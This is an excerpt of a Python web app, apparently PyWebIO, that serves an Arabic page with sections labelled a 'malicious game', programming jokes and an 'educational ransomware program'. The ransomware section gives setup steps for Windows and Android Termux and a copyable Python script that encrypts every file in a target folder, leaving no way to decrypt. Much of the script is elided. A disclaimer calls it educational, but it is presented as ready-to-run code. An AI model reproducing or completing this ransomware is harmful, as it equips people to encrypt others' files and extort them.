...
def web_main():
    ...
    <!-- القسم: أنماط CSS - النهاية -->

    <!-- القسم: روابط التواصل - البداية -->
    <div class="container">
    ...
    <!-- القسم: روابط التواصل - النهاية -->

    <!-- القسم: اللعبة الخبيثة - البداية -->
    <div class="container">
...
<!-- القسم: اللعبة الخبيثة - النهاية -->

    <!-- القسم: برنامج الفدية التعليمي المحسّن - البداية -->
    <div class="container">
        <h3>برنامج الفدية التعليمي المحسّن</h3>
        <div class="warning">
1. تثبيت مكتبة التشفير

افتح نافذة الأوامر.

نفّذ الأمر التالي:
(بايب إنستول كريبتوغرافي)



2. إعداد مجلد الاختبار
...
2. أنشئ مجلداً جديداً باسم اختبار.



على أندرويد (ترمكس):

1. مرّة واحدة فقط، نفّذ:
(تيرمكس-سيتاب-ستوريدج)


2. أنشئ مجلداً باسم اختبار داخل التنزيلات.
...
انتقل إلى المجلد حيث حفظت تشفير.باي:
(سي-دي سطح المكتب)
أو في ترمكس:
(سي-دي ستوريدج/داونلودز/اختبار)

ثم نفّذ:
(بايثون تشفير.باي)

سيُنشئ السكربت ملف مفتاح. ثم يُشفّر جميع الملفات داخل مجلد اختبار.



5. ملاحظة هامة

احتفظ بملف مفتاح. في مكان آمن لفك التشفير لاحقاً.

الكود الحالي يقتصر على تشفير الملفات فقط ولا يتضمّن فكّ التشفير.
        </div>
        <textarea id="ransomCodeArea"># هذا الكود هو مثال مبسط جداً لأغراض تعليمية فقط ولا يجب استخدامه كبرنامج فدية حقيقي.
# استخدام برامج الفدية غير قانوني وغير أخلاقي.
...
if __name__ == "__main__":
    ...
    # تحديد مجلد مناسب لكل نظام
    if os.name == "nt":  # ويندوز
        target_dir = os.path.expanduser("~/Desktop/test")  # أنشئ مجلد test على سطح المكتب
    else:  # أندرويد عبر Termux
        target_dir = os.path.expanduser("~/storage/downloads/test")  # أنشئ مجلد test داخل التنزيلات
    ...
    for filename in os.listdir(target_dir):
        ...
        if os.path.isfile(filepath):
            try:
                ...
                print(f"تم تشفير: {filename}")
            except Exception as e:
                print(f"فشل تشفير {filename}: {e}")

    print("\nتم تشفير الملفات.")
</textarea>
        <button id="copyRansomBtn" onclick="navigator.clipboard.writeText(document.getElementById('ransomCodeArea').value).then(()=>alert('✅تم نسخ كود برنامج الفدية!'))">نسخ الكود</button>
    </div>
<!-- القسم: برنامج الفدية التعليمي المحسّن - النهاية -->

    <!-- القسم: نكات برمجية - المستوى الأول - البداية -->
    <div class="container">
...
<!-- القسم: نكات برمجية - المستوى الأول - النهاية -->

    <!-- القسم: نكات برمجية - المستوى الثاني - البداية -->
    <div class="container">
...
<!-- القسم: نكات برمجية - المستوى الثاني - النهاية -->
    ''')

# <!-- القسم: تشغيل الخادم - الب/داية -->
if __name__ == '__main__':
    PORT = int(os.getenv("PORT", 10000))
    start_server(web_main, port=PORT, debug=True)
# <!-- القسم: تشغيل الخادم - النهاية -->